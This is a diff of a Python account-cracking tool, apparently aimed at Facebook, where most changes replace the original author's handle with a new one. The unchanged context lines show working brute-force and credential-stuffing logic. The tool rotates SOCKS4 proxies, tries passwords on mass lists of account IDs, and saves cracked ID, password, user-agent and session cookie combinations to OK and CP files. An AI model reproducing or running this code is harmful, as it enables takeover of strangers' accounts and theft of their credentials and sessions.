@@ -62,7 +62,7 @@ try:
 	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 	open('.prox.txt','w').write(prox)
 except Exception as e:
-	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mKhoirul-Xd')
+	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
 prox=open('.prox.txt','r').read().splitlines()
 for ut in range(10000):
 	rr = random.randint
@@ -355,9 +355,9 @@ def login():
              [bold green]WhatsApp: [blue]081283547452
              [bold green]GitHub: [blue]https://github.com/khoirulez""",width=70, padding=(0, 7), style=f"{color_panel}"))
 	prints(nel(f'              {P2}[bold blue]Menu Tools Crack{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
-	prints(nel(f"""{P2}{color_text}01{P2} [bold green]Crack Massal    {color_text}04{P2} [bold green]Cek Ressult
-{color_text}02{P2} [bold green]Crack Publik    {color_text}05{P2} [bold green]Crack File
-{color_text}03{P2} [bold green]Clone ID Email  {color_text}00{P2} [bold green]Exit Program""",width=70,padding=(0,7),style=f"{color_panel}"))
+	prints(nel(f"""{P2}{color_text}01{P2} [green]Crack Massal    {color_text}04{P2} [green]Cek Ressult
+{color_text}02{P2} [green]Crack Publik    {color_text}05{P2} [green]Crack File
+{color_text}03{P2} [green]Clone ID Email  {color_text}00{P2} [green]Exit Program""",width=70,padding=(0,7),style=f"{color_panel}"))
 	___Sllowly_ID____ = input(f'✶ ━━⫸ {H} Input{N} : ')
 	if ___Sllowly_ID____ in ['1']:
 		massal()
@@ -781,7 +781,7 @@ def validate1(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xdz-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyzz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -790,7 +790,7 @@ def validate1(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyzz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -803,7 +803,7 @@ def validate1(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
 					print('\n')
 					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
+					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyzz-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
@@ -813,7 +813,7 @@ def validate1(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
 					print('\n')
 					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
+					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
@@ -850,7 +850,7 @@ def validate2(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -859,7 +859,7 @@ def validate2(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -872,7 +872,7 @@ def validate2(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
 					print('\n')
 					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
+					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
@@ -882,7 +882,7 @@ def validate2(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
 					print('\n')
 					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
+					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
@@ -919,7 +919,7 @@ def validate3(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -928,7 +928,7 @@ def validate3(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -941,7 +941,7 @@ def validate3(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
 					print('\n')
 					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
+					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
@@ -1008,7 +1008,7 @@ def reguler1(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1017,7 +1017,7 @@ def reguler1(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1030,7 +1030,7 @@ def reguler1(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
 					print('\n')
 					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
+					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
@@ -1040,7 +1040,7 @@ def reguler1(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
 					print('\n')
 					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
+					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
@@ -1094,7 +1094,7 @@ def reguler2(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1103,7 +1103,7 @@ def reguler2(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1116,7 +1116,7 @@ def reguler2(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
 					print('\n')
 					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
+					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
@@ -1126,7 +1126,7 @@ def reguler2(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
 					print('\n')
 					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
+					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
@@ -1182,7 +1182,7 @@ def reguler3(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1191,7 +1191,7 @@ def reguler3(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1204,7 +1204,7 @@ def reguler3(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
 					print('\n')
 					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
+					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
@@ -1214,7 +1214,7 @@ def reguler3(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
 					print('\n')
 					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
+					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
@@ -1271,7 +1271,7 @@ def kontol(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1280,7 +1280,7 @@ def kontol(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1293,7 +1293,7 @@ def kontol(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
 					print('\n')
 					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
+					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
@@ -1303,7 +1303,7 @@ def kontol(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
 					print('\n')
 					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
+					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
@@ -1360,7 +1360,7 @@ def bapi(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1369,7 +1369,7 @@ def bapi(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1382,7 +1382,7 @@ def bapi(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
 					print('\n')
 					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
+					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
@@ -1392,7 +1392,7 @@ def bapi(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
 					print('\n')
 					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
+					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
